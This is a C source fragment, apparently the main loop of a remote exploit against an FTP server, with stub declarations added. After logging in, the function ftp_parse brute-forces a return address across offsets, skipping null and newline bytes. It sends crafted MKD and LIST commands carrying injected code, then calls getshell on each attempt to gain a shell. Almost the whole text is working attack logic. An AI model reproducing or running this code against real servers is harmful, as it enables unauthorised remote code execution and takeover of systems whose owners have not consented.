
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int attempts ;
 unsigned int baseaddr ;
 int basedir ;
 int close (int) ;
 int ftp_clean (int) ;
 int ftp_printf (int,char*,int ) ;
 int ftp_read (int) ;
 int getbdir () ;
 int getcode () ;
 int getdir (unsigned int) ;
 int getshell (int,unsigned int) ;
 int pass ;
 int printf (char*) ;
 scalar_t__ reverse ;
 int sleep (int) ;
 int user ;
 int writedir ;

void ftp_parse(int sock){
 unsigned int offset=0;
 ftp_read(sock);
 ftp_printf(sock,"USER %s\r\n",user);
 ftp_read(sock);
 ftp_printf(sock,"PASS %s\r\n",pass);
 ftp_read(sock);
 ftp_printf(sock,"CWD %s\r\n",writedir);
 ftp_read(sock);
 basedir=getbdir();
 ftp_printf(sock,"MKD %s\r\n",basedir);
 ftp_read(sock);
 ftp_printf(sock,"CWD %s\r\n",basedir);
 ftp_read(sock);
 while(offset<(attempts*400)){

  if((!reverse&&!((baseaddr-offset)&0xff))||(reverse&&!((baseaddr+offset)
  &0xff))||(!reverse&&((baseaddr-offset)&0xff)=='\n')||(reverse&&
  ((baseaddr+offset)&0xff)=='\n')){
   printf("[!] brute address contains null-byte/CR, increasing offset "
   "by one byte.\n");
   offset++;
  }

  ftp_printf(sock,"MKD %s\r\n",getdir(offset));
  ftp_read(sock);

  sleep(1);
  ftp_printf(sock,"LIST -%s\r\n",getcode());



  sleep(1);

  ftp_printf(sock,"RMD %s\r\n",getdir(offset));
  ftp_read(sock);
  getshell(sock,offset);
  offset+=400;
 }
 ftp_clean(sock);
 close(sock);
 return;
}
